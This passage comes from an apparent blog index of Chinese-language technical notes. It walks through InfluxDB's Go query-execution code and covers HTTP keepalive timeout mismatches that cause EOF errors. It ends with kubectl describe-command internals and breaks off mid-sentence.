limit.\n\t\t\t\t\tif i < len(r.Series) {\n\t\t\t\t\t\tr.Series = r.Series[:i+1]\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// It's not chunked so buffer results in memory.\n\t\t// Results for statements need to be combined together.\n\t\t// We need to check if this new result is for the same statement as\n\t\t// the last result, or for the next statement\n\t\tl := len(resp.Results)\n\t\tif l == 0 {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t} else if resp.Results[l-1].StatementID == r.StatementID {\n\t\t\tif r.Err != nil {\n\t\t\t\tresp.Results[l-1] = r\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tcr := resp.Results[l-1]\n\t\t\trowsMerged := 0\n\t\t\tif len(cr.Series) > 0 {\n\t\t\t\tlastSeries := cr.Series[len(cr.Series)-1]\n\n\t\t\t\tfor _, row := range r.Series {\n\t\t\t\t\tif !lastSeries.SameSeries(row) {\n\t\t\t\t\t\t// Next row is for a different series than last.\n\t\t\t\t\t\tbreak\n\t\t\t\t\t}\n\t\t\t\t\t// Values are for the same series, so append them.\n\t\t\t\t\tlastSeries.Values = append(lastSeries.Values, row.Values...)\n\t\t\t\t\trowsMerged++\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Append remaining rows as new rows.\n\t\t\tr.Series = r.Series[rowsMerged:]\n\t\t\tcr.Series = append(cr.Series, r.Series...)\n\t\t\tcr.Messages = append(cr.Messages, r.Messages...)\n\t\t\tcr.Partial = r.Partial\n\t\t} else {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t}\n\n\t\t// Drop out of this loop and do not process further results when we hit the row limit.\n\t\tif h.Config.MaxRowLimit > 0 && rows >= h.Config.MaxRowLimit {\n\t\t\t// If the result is marked as partial, remove that partial marking\n\t\t\t// here. While the series is partial and we would normally have\n\t\t\t// tried to return the rest in the next chunk, we are not using\n\t\t\t// chunking and are truncating the series so we don't want to\n\t\t\t// signal to the client that we plan on sending another JSON blob\n\t\t\t// with another result.  The series, on the other hand, still\n\t\t\t// returns partial true if it was truncated or had more data to\n\t\t\t// send in a future chunk.\n\t\t\tr.Partial = false\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// If it's not chunked we buffered everything in memory, so write it out\n\tif !chunked {\n\t\tn, _ := rw.WriteResponse(resp)\n\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t}\n}\n```\n\n函数ParseQuery函数解析query：\n\n```go\n// ParseQuery parses an InfluxQL string and returns a Query AST object.\nfunc (p *Parser) ParseQuery() (*Query, error) {\n\tvar statements Statements\n\tsemi := true\n\n\tfor {\n\t\tif tok, pos, lit := p.ScanIgnoreWhitespace(); tok == EOF {//如果tok==EOF的时候，正常解析完成返回;\n\t\t\treturn &Query{Statements: statements}, nil\n\t\t} else if tok == SEMICOLON {\n\t\t\tsemi = true\n\t\t} else {\n\t\t\tif !semi {\n\t\t\t\treturn nil, newParseError(tokstr(tok, lit), []string{\";\"}, pos)\n\t\t\t}\n\t\t\tp.Unscan()\n\t\t\ts, err := p.ParseStatement() //解析词\n\t\t\tif err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\tstatements = append(statements, s) //返回解析的statments\n\t\t\tsemi = false\n\t\t}\n\t}\n}\n```\n\n执行解析的executeQuery函数：\n\n```go\n// ExecuteQuery executes each statement within a query.\nfunc (e *Executor) ExecuteQuery(query *influxql.Query, opt ExecutionOptions, closing chan struct{}) <-chan *Result {\n\tresults := make(chan *Result)\n\tgo e.executeQuery(query, opt, closing, results)  //执行查询语句\n\treturn results\n}\n```\n\n调用executeQuery函数：\n\n```go\nfunc (e *Executor) executeQuery(query *influxql.Query, opt ExecutionOptions, closing <-chan struct{}, results chan *Result) {\n\tdefer close(results)\n\tdefer e.recover(query, results)\n\n\tatomic.AddInt64(&e.stats.ActiveQueries, 1)\n\tatomic.AddInt64(&e.stats.ExecutedQueries, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&e.stats.ActiveQueries, -1)\n\t\tatomic.AddInt64(&e.stats.FinishedQueries, 1)\n\t\tatomic.AddInt64(&e.stats.QueryExecutionDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n// 使用taskManager来管理查询query,返回一个channel，当query完成running的时候。\n\tctx, detach, err := e.TaskManager.AttachQuery(query, opt, closing)\n\tif err != nil {\n\t\tselect {\n\t\tcase results <- &Result{Err: err}:\n\t\tcase <-opt.AbortCh:\n\t\t}\n\t\treturn\n\t}\n\tdefer detach()\n\n\t// Setup the execution context that will be used when executing statements.\n\tctx.Results = results\n\n\tvar i int\nLOOP:\n\tfor ; i < len(query.Statements); i++ {\n\t\tctx.statementID = i\n\t\tstmt := query.Statements[i]\n\n\t\t// If a default database wasn't passed in by the caller, check the statement.\n\t\tdefaultDB := opt.Database\n\t\tif defaultDB == \"\" {\n\t\t\tif s, ok := stmt.(influxql.HasDefaultDatabase); ok {\n\t\t\t\tdefaultDB = s.DefaultDatabase()\n\t\t\t}\n\t\t}\n\n\t\t// Do not let queries manually use the system measurements. If we find\n\t\t// one, return an error. This prevents a person from using the\n\t\t// measurement incorrectly and causing a panic.\n\t\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\t\tfor _, s := range stmt.Sources {\n\t\t\t\tswitch s := s.(type) {\n\t\t\t\tcase *influxql.Measurement:\n\t\t\t\t\tif influxql.IsSystemName(s.Name) {\n\t\t\t\t\t\tcommand := \"the appropriate meta command\"\n\t\t\t\t\t\tswitch s.Name {\n\t\t\t\t\t\tcase \"_fieldKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW FIELD KEYS\"\n\t\t\t\t\t\tcase \"_measurements\":\n\t\t\t\t\t\t\tcommand = \"SHOW MEASUREMENTS\"\n\t\t\t\t\t\tcase \"_series\":\n\t\t\t\t\t\t\tcommand = \"SHOW SERIES\"\n\t\t\t\t\t\tcase \"_tagKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG KEYS\"\n\t\t\t\t\t\tcase \"_tags\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG VALUES\"\n\t\t\t\t\t\t}\n\t\t\t\t\t\tresults <- &Result{\n\t\t\t\t\t\t\tErr: fmt.Errorf(\"unable to use system source '%s': use %s instead\", s.Name, command),\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak LOOP\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Rewrite statements, if necessary.\n\t\t// This can occur on meta read statements which convert to SELECT statements.\n\t\tnewStmt, err := RewriteStatement(stmt)\n\t\tif err != nil {\n\t\t\tresults <- &Result{Err: err}\n\t\t\tbreak\n\t\t}\n\t\tstmt = newStmt\n\n\t\t// Normalize each statement if possible.\n\t\tif normalizer, ok := e.StatementExecutor.(StatementNormalizer); ok {\n\t\t\tif err := normalizer.NormalizeStatement(stmt, defaultDB, opt.RetentionPolicy); err != nil {\n\t\t\t\tif err := ctx.send(&Result{Err: err}); err == ErrQueryAborted {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\n\t\t// Log each normalized statement.\n\t\tif !ctx.Quiet {\n\t\t\te.Logger.Info(\"Executing query\", zap.Stringer(\"query\", stmt))\n\t\t}\n\n\t\t// Send any other statements to the underlying statement executor.\n\t\terr = e.StatementExecutor.ExecuteStatement(stmt, ctx)\n\t\tif err == ErrQueryInterrupted {\n\t\t\t// Query was interrupted so retrieve the real interrupt error from\n\t\t\t// the query task if there is one.\n\t\t\tif qerr := ctx.Err(); qerr != nil {\n\t\t\t\terr = qerr\n\t\t\t}\n\t\t}\n\n\t\t// Send an error for this result if it failed for some reason.\n\t\tif err != nil {\n\t\t\tif err := ctx.send(&Result{\n\t\t\t\tStatementID: i,\n\t\t\t\tErr:         err,\n\t\t\t}); err == ErrQueryAborted {\n\t\t\t\treturn\n\t\t\t}\n\t\t\t// Stop after the first error.\n\t\t\tbreak\n\t\t}\n\n\t\t// Check if the query was interrupted during an uninterruptible statement.\n\t\tinterrupted := false\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tinterrupted = true\n\t\tdefault:\n\t\t\t// Query has not been interrupted.\n\t\t}\n\n\t\tif interrupted {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// Send error results for any statements which were not executed.\n\tfor ; i < len(query.Statements)-1; i++ {\n\t\tif err := ctx.send(&Result{\n\t\t\tStatementID: i,\n\t\t\tErr:         ErrNotExecuted,\n\t\t}); err == ErrQueryAborted {\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n函数AttachQuery用于管理当前查询的query的状态\n\n```go\n// AttachQuery attaches a running query to be managed by the TaskManager.\n// Returns the query id of the newly attached query or an error if it was\n// unable to assign a query id or attach the query to the TaskManager.\n// This function also returns a channel that will be closed when this\n// query finishes running.\n//\n// After a query finishes running, the system is free to reuse a query id.\nfunc (t *TaskManager) AttachQuery(q *influxql.Query, opt ExecutionOptions, interrupt <-chan struct{}) (*ExecutionContext, func(), error) {\n\tt.mu.Lock()\n\tdefer t.mu.Unlock()\n\n\tif t.shutdown {\n\t\treturn nil, nil, ErrQueryEngineShutdown\n\t}\n\n\tif t.MaxConcurrentQueries > 0 && len(t.queries) >= t.MaxConcurrentQueries {\n\t\treturn nil, nil, ErrMaxConcurrentQueriesLimitExceeded(len(t.queries), t.MaxConcurrentQueries)\n\t}\n\n\tqid := t.nextID\n    //初始化task\n\tquery := &Task{\n\t\tquery:     q.String(),\n\t\tdatabase:  opt.Database,\n\t\tstatus:    RunningTask,\n\t\tstartTime: time.Now(),\n\t\tclosing:   make(chan struct{}),\n\t\tmonitorCh: make(chan error),\n\t}\n\tt.queries[qid] = query\n\n\tgo t.waitForQuery(qid, query.closing, interrupt, query.monitorCh)//开启协程来监听query是否结束。\n\tif t.LogQueriesAfter != 0 {\n\t\tgo query.monitor(func(closing <-chan struct{}) error {\n\t\t\ttimer := time.NewTimer(t.LogQueriesAfter)//检测到慢查询的时候，报警。\n\t\t\tdefer timer.Stop()\n\n\t\t\tselect {\n\t\t\tcase <-timer.C:\n\t\t\t\tt.Logger.Warn(fmt.Sprintf(\"Detected slow query: %s (qid: %d, database: %s, threshold: %s)\",\n\t\t\t\t\tquery.query, qid, query.database, t.LogQueriesAfter))\n\t\t\tcase <-closing:\n\t\t\t}\n\t\t\treturn nil\n\t\t})\n\t}\n\tt.nextID++\n    //初始化一个ctx上下文\n\tctx := &ExecutionContext{\n\t\tContext:          context.Background(),\n\t\tQueryID:          qid,\n\t\ttask:             query,\n\t\tExecutionOptions: opt,\n\t}\n\tctx.watch()\n   \t// detach query，从查询table中去除。\n\treturn ctx, func() { t.DetachQuery(qid) }, nil\n    \n}\n```\n\n将解析出来的statement执行函数ExecuteStatement\n\n```go\n// ExecuteStatement executes the given statement with the given execution context.\nfunc (e *StatementExecutor) ExecuteStatement(stmt influxql.Statement, ctx *query.ExecutionContext) error {\n\t// Select statements are handled separately so that they can be streamed.\n    //特殊处理select查询\n\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\treturn e.executeSelectStatement(stmt, ctx)\n\t}\n\n\tvar rows models.Rows\n\tvar messages []*query.Message\n\tvar err error\n\tswitch stmt := stmt.(type) {\n     //根据每个类别分别处理不同type的查询语句，有点多，自己看下吧~~~\n\tcase *influxql.AlterRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeAlterRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateContinuousQueryStatement(stmt)\n\tcase *influxql.CreateDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateDatabaseStatement(stmt)\n\tcase *influxql.CreateRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateSubscriptionStatement(stmt)\n\tcase *influxql.CreateUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateUserStatement(stmt)\n\tcase *influxql.DeleteSeriesStatement:\n\t\terr = e.executeDeleteSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropContinuousQueryStatement(stmt)\n\tcase *influxql.DropDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropDatabaseStatement(stmt)\n\tcase *influxql.DropMeasurementStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropMeasurementStatement(stmt, ctx.Database)\n\tcase *influxql.DropSeriesStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropRetentionPolicyStatement(stmt)\n\tcase *influxql.DropShardStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropShardStatement(stmt)\n\tcase *influxql.DropSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSubscriptionStatement(stmt)\n\tcase *influxql.DropUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropUserStatement(stmt)\n\tcase *influxql.ExplainStatement:\n\t\tif stmt.Analyze {\n\t\t\trows, err = e.executeExplainAnalyzeStatement(stmt, ctx)\n\t\t} else {\n\t\t\trows, err = e.executeExplainStatement(stmt, ctx)\n\t\t}\n\tcase *influxql.GrantStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantStatement(stmt)\n\tcase *influxql.GrantAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantAdminStatement(stmt)\n\tcase *influxql.RevokeStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeStatement(stmt)\n\tcase *influxql.RevokeAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeAdminStatement(stmt)\n\tcase *influxql.ShowContinuousQueriesStatement:\n\t\trows, err = e.executeShowContinuousQueriesStatement(stmt)\n\tcase *influxql.ShowDatabasesStatement:\n\t\trows, err = e.executeShowDatabasesStatement(stmt, ctx)\n\tcase *influxql.ShowDiagnosticsStatement:\n\t\trows, err = e.executeShowDiagnosticsStatement(stmt)\n\tcase *influxql.ShowGrantsForUserStatement:\n\t\trows, err = e.executeShowGrantsForUserStatement(stmt)\n\tcase *influxql.ShowMeasurementsStatement:\n\t\treturn e.executeShowMeasurementsStatement(stmt, ctx)\n\tcase *influxql.ShowMeasurementCardinalityStatement:\n\t\trows, err = e.executeShowMeasurementCardinalityStatement(stmt)\n\tcase *influxql.ShowRetentionPoliciesStatement:\n\t\trows, err = e.executeShowRetentionPoliciesStatement(stmt)\n\tcase *influxql.ShowSeriesCardinalityStatement:\n\t\trows, err = e.executeShowSeriesCardinalityStatement(stmt)\n\tcase *influxql.ShowShardsStatement:\n\t\trows, err = e.executeShowShardsStatement(stmt)\n\tcase *influxql.ShowShardGroupsStatement:\n\t\trows, err = e.executeShowShardGroupsStatement(stmt)\n\tcase *influxql.ShowStatsStatement:\n\t\trows, err = e.executeShowStatsStatement(stmt)\n\tcase *influxql.ShowSubscriptionsStatement:\n\t\trows, err = e.executeShowSubscriptionsStatement(stmt)\n\tcase *influxql.ShowTagKeysStatement:\n\t\treturn e.executeShowTagKeys(stmt, ctx)\n\tcase *influxql.ShowTagValuesStatement:\n\t\treturn e.executeShowTagValues(stmt, ctx)\n\tcase *influxql.ShowUsersStatement:\n\t\trows, err = e.executeShowUsersStatement(stmt)\n\tcase *influxql.SetPasswordUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeSetPasswordUserStatement(stmt)\n\tcase *influxql.ShowQueriesStatement, *influxql.KillQueryStatement:\n\t\t// Send query related statements to the task manager.\n\t\treturn e.TaskManager.ExecuteStatement(stmt, ctx)\n\tdefault:\n\t\treturn query.ErrInvalidQuery\n\t}\n\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn ctx.Send(&query.Result{\n\t\tSeries:   rows,\n\t\tMessages: messages,\n\t})\n}\n```\n\n针对不同类型的statment执行不同的查询tsdb过程。以select查询为例。，executeSelectStatement单独处理，为了能够streamed。\n\n```go\nfunc (e *StatementExecutor) executeSelectStatement(stmt *influxql.SelectStatement, ctx *query.ExecutionContext) error {\n\t//创建迭代器\n    cur, err := e.createIterators(ctx, stmt, ctx.ExecutionOptions)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Generate a row emitter from the iterator set.\n    // 从迭代器中生成一个row emitter，chunkSize大小。\n\tem := query.NewEmitter(cur, ctx.ChunkSize)\n\tdefer em.Close()\n\n\t// Emit rows to the results channel.\n\tvar writeN int64\n\tvar emitted bool\n\n\tvar pointsWriter *BufferedPointsWriter\n\tif stmt.Target != nil {\n        //初始化\n\t\tpointsWriter = NewBufferedPointsWriter(e.PointsWriter, stmt.Target.Measurement.Database, stmt.Target.Measurement.RetentionPolicy, 10000)\n\t}\n\n\tfor {\n        // 查询数据\n\t\trow, partial, err := em.Emit()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t} else if row == nil {\n\t\t\t// Check if the query was interrupted while emitting.\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\treturn ctx.Err()\n\t\t\tdefault:\n\t\t\t}\n\t\t\tbreak\n\t\t}\n\n\t\t// Write points back into system for INTO statements.\n        // INTO不为空，则写入这个pointswriter\n\t\tif stmt.Target != nil {\n\t\t\tif err := e.writeInto(pointsWriter, stmt, row); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\twriteN += int64(len(row.Values))\n\t\t\tcontinue\n\t\t}\n\n\t\tresult := &query.Result{\n\t\t\tSeries:  []*models.Row{row},\n\t\t\tPartial: partial,\n\t\t}\n\n\t\t// Send results or exit if closing.\n        //发送结果\n\t\tif err := ctx.Send(result); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\temitted = true\n\t}\n\n\t// Flush remaining points and emit write count if an INTO statement.\n\tif stmt.Target != nil {\n\t\tif err := pointsWriter.Flush(); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tvar messages []*query.Message\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\n\t\treturn ctx.Send(&query.Result{\n\t\t\tMessages: messages,\n\t\t\tSeries: []*models.Row{{\n\t\t\t\tName:    \"result\",\n\t\t\t\tColumns: []string{\"time\", \"written\"},\n\t\t\t\tValues:  [][]interface{}{{time.Unix(0, 0).UTC(), writeN}},\n\t\t\t}},\n\t\t})\n\t}\n\n\t// Always emit at least one result.\n\tif !emitted {\n\t\treturn ctx.Send(&query.Result{\n\t\t\tSeries: make([]*models.Row, 0),\n\t\t})\n\t}\n\n\treturn nil\n}\n```\n\nemit函数查询获取数据并返回:\n\n```go\n// Emit returns the next row from the iterators.\nfunc (e *Emitter) Emit() (*models.Row, bool, error) {\n\t// Continually read from the cursor until it is exhausted.\n\tfor {\n\t\t// Scan the next row. If there are no rows left, return the current row.\n\t\tvar row Row\n\t\tif !e.cur.Scan(&row) {\n\t\t\tif err := e.cur.Err(); err != nil {\n\t\t\t\treturn nil, false, err\n\t\t\t}\n\t\t\tr := e.row\n\t\t\te.row = nil\n\t\t\treturn r, false, nil\n\t\t}\n\n\t\t// If there's no row yet then create one.\n\t\t// If the name and tags match the existing row, append to that row if\n\t\t// the number of values doesn't exceed the chunk size.\n\t\t// Otherwise return existing row and add values to next emitted row.\n\t\tif e.row == nil {\n\t\t\te.createRow(row.Series, row.Values)\n\t\t} else if e.series.SameSeries(row.Series) {\n\t\t\tif e.chunkSize > 0 && len(e.row.Values) >= e.chunkSize {//如果查询数据量大于chunkSize，则返回，同时 partial=true标识。\n\t\t\t\tr := e.row\n\t\t\t\tr.Partial = true\n\t\t\t\te.createRow(row.Series, row.Values)\n\t\t\t\treturn r, true, nil\n\t\t\t}\n\t\t\te.row.Values = append(e.row.Values, row.Values)\n\t\t} else {\n\t\t\tr := e.row\n\t\t\te.createRow(row.Series, row.Values)\n\t\t\treturn r, true, nil\n\t\t}\n\t}\n}\n```\n\n\n\n #### 总结\n\n大概看了下influxdb从启动到服务查询接口的整体流程。以select为例，看了不同的query查询和解析方式类似，都需要走解析查询的。词法解析器是 influxdb自己写的。 底层如何构建的以后再讨论吧。还有很多细节需要自己去看下了。orz\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["influxdb"],"categories":["influxdb"]},{"title":"golang","url":"/2017/05/26/gotips/","content":"\n## golang超时问题\n\ngolang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记录下。\n\n当在编写一个Go语言的HTTP服务端或者是客户端时，超时是最容易同时也是最敏感的错误，有很多选择，一个错误可以导致很长时间没有结果，知道网络出现故障，或者进程宕掉。\n\n在分析过程中，发现服务之间调用有EOF的问题，一般情况下是两个服务之间的readtimeout和writetimeout设置超时导致的。当然也有一个keepalive超时的问题。需要保证服务A调用服务B的时候，服务A的keepalive大于服务B的keepalive。\n\npython服务器gunicon在设置keepalive的时候，之前遇到过默认情况的keepalive时间给了5s钟，遇到服务A的keepalive时间大于60s的时候，可能服务B的连接已经断开了，但是服务A还维持的会话，当获取数据的时候发现读取数据失败返回EOF问题了。\n\n建议保证：服务B的Keepalive时间 > 服务A的keepalive时间\n\n![HTTP server phases](http://img.kuqin.com/upimg/allimg/160720/2036151E2-0.png)\n\n![HTTP Client phases](http://img.kuqin.com/upimg/allimg/160720/2036154434-1.png)\n\n### 参考资料\n\nhttps://studygolang.com/articles/7692\n","tags":["golang"],"categories":["golang"]},{"title":"kubectl 学习笔记","url":"/2017/05/26/kubectl/","content":"\n\n## kubectl 学习笔记\n\n思考：kubectl 和docker命令源码的设计思想类似。\n\ndocker中启动了服务器接受请求注册*api*, 而kubectl发送命令给apiserver请求数据或者创建资源。\n\nCmds是kubectl中的命令集合，所有命令都会整理在里面。\n\nCmd 是命令的实体，其中主要是具体执行用户命令。每个cmd负责一个命令执行类型(describe,get...)。\n\nBuilder 是cmd执行操作时的辅助工具，主要是负责封装与Apiserver交互的底层操作，和将Apiserver的返回数据转化为统一数据结构。\n\nKubectl 依赖于[cobra](https://github.com/spf13/cobra)包构建命令行支持，该包是支持通用的命令行构建库。\n\n```\nCmds(命令集合)<---Cmd(命令obj)\n       |          |\n       |          |\n       |          | \n       |        Builder\n       |          |\n       |          |  \n       |----------Cmd(命令obj)\n```\n\nKubectl 的执行流程分析以describe命令分析。\n\n1. 用户发起请求\n2. 根据用户执行动作分发给处理对应动作的Cmd (Cmd是执行用户命令的实体)\n3. 解析用户命令\n4. 向Apiserver获取数据\n5. 整理返回为通用的数据集合\n6. 找到解释查询类型数据的句柄\n7. 使用具柄对整理出的数据集合进行打印输出\n\n```\nkubectl describe node node1\n```\n\n如下, NewKubectlCommand 方法中cobra会根据命令动作将请求分配给describe注册的cmd。\n\n```\ngroups := templates.CommandGroups{\n        //...\n        {\n            Message: \"Troubleshooting and Debugging Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdDescribe(f, out, err),    //<------describe操作的cmd\n                NewCmdLogs(f, out),\n                NewCmdAttach(f, in, out, err),\n                NewCmdExec(f, in, out, err),\n                NewCmdPortForward(f, out, err),\n                NewCmdProxy(f, out),\n                NewCmdCp(f, out, err),\n                auth.NewCmdAuth(f, out, err),\n            },\n        },\n        {\n            Message: \"Advanced Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdApply(\"kubectl\", f, out, err),\n                NewCmdPatch(f, out),\n                NewCmdReplace(f, out),\n                NewCmdConvert(f, out),\n            },\n        },\n        // ...\n    }\n    groups.Add(cmds)\n```\n\nCmd会对获取用户输入数据， 并检查正确性然后使用Run函数处理。\n\n```\nfunc NewCmdDescribe(f cmdutil.Factory, out, cmdErr io.Writer) *cobra.Command {\n    options := &resource.FilenameOptions{}\n    describerSettings := &printers.DescriberSettings{}\n\n    validArgs := printersinternal.DescribableResources()\n    argAliases := kubectl.ResourceAliases(validArgs)\n\n    cmd := &cobra.Command{\n        Use:     \"describe (-f FILENAME | TYPE [NAME_PREFIX | -l label] | TYPE/NAME)\",\n        Short:   i18n.T(\"Show details of a specific resource or group of resources\"),\n        Long:    describeLong + \"\\n\\n\" + cmdutil.ValidResourceTypeList(f),\n        Example: describeExample,\n        Run: func(cmd *cobra.Command, args []string) {   // <------处理回调函数\n            err := RunDescribe(f, out, cmdErr, cmd, args, options, describerSettings)\n            cmdutil.CheckErr(err)\n        },\n        ValidArgs:  validArgs,     //<-----------------合法性检查 \n        ArgAliases: argAliases,\n    }\n    usage := \"containing the resource to describe\"\n    cmdutil.AddFilenameOptionFlags(cmd, options, usage)\n    \n    // 下面主要是输入参数检查 \n    \n    cmd.Flags().StringP(\"selector\", \"l\", \"\", \"Selector (label query) to filter on, supports '=', '==', and '!='.(e.g. -l key1=value1,key2=value2)\")\n    cmd.Flags().Bool(\"all-namespaces\", false, \"If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even if specified with --namespace.\")\n    cmd.Flags().BoolVar(&describerSettings.ShowEvents, \"show-events\", true, \"If true, display events related to the described object.\")\n    cmdutil.AddInclude3rdPartyFlags(cmd)\n    cmdutil.AddIncludeUninitializedFlag(cmd)\n    return cmd\n}\n```\n\n如下, 在 RunDescribe 中时对该命令的具体处理\n\n- Builder(), Unstructured(), ContinueOnError().\n   NamespaceParam(), FilenameParam(), LabelSelectorParam() ... Flatten() 的链式调用流程主要是为执行命令做准备。\n- Do() 函数是注册具体向Apiserver请求数据，和讲返回数据转化为通用结构的方法。\n- 最后的 describer.Describe（） 函数是将提取出的返回数据 打印出来做可视化接口。\n\n```\nfunc RunDescribe(f cmdutil.Factory, out, cmdErr io.Writer, cmd *cobra.Command, args []string, options *resource.FilenameOptions, describerSettings *printers.DescriberSettings) error {\n    \n    // ...\n\n    // include the uninitialized objects by default\n    // unless user explicitly set --include-uninitialized=false\n    includeUninitialized := cmdutil.ShouldIncludeUninitialized(cmd, true)\n    r := f.NewBuilder().\n        Unstructured().\n        ContinueOnError().\n        NamespaceParam(cmdNamespace).DefaultNamespace().AllNamespaces(allNamespaces).\n        FilenameParam(enforceNamespace, options).\n        LabelSelectorParam(selector).    // 设置用户的标签选择\n        IncludeUninitialized(includeUninitialized).\n        ResourceTypeOrNameArgs(true, args...). // 提取用户选择操作的对象类型\n        Flatten().                             //决定以何种方式从K8s的返回数据中提取信息                     \n        Do()                                   //执行命令获取数据\n    \n    // ...\n    \n    infos, err := r.Infos()                     \n    if err != nil {\n        if apierrors.IsNotFound(err) && len(args) == 2 {\n            return DescribeMatchingResources(f, cmdNamespace, args[0], args[1], describerSettings, out, err)\n        }\n        allErrs = append(allErrs, err)\n    }\n\n    errs := sets.NewString()\n    first := true\n    for _, info := range infos {\n        mapping := info.ResourceMapping()\n        describer, err := f.Describer(mapping)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        // 下面通过describe 方法将提取到的数据 打印出来\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        if first {\n            first = false\n            fmt.Fprint(out, s)\n        } else {\n            fmt.Fprintf(out, \"\\n\\n%s\", s)\n        }\n    }\n\n    return utilerrors.NewAggregate(allErrs)\n}\n```\n\n下面具体分析获取数据的流程，获取数据包括从Apiserver请求数据以及从返回信息中提取有用数据两个操作。\n\nRetrieveLazy 中注册了从Apiserver获取数据的操作。\nNewDecoratedVisitor 